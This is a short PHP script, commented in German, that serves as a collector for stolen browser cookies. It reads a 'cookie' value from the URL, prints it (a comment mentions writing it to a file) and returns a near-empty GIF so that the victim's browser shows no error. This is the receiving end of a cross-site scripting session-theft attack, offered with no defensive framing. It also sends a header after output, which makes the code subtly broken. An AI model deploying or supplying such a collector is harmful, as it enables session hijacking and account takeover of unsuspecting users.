<?php
// Schritt 1: Cookie-Parameter auslesen
$cookie = isset($_GET['cookie']) ? $_GET['cookie'] : '';

// Schritt 2: Ausgeben (oder in eine Datei schreiben)
echo "Cookie empfangen: " . htmlentities($cookie);

// Optional: Sende (fast) leeres Bild, damit im Browser kein Fehler angezeigt wird
header("Content-Type: image/gif");
echo base64_decode("R0lGODlhAQABAAAAACw=");
?>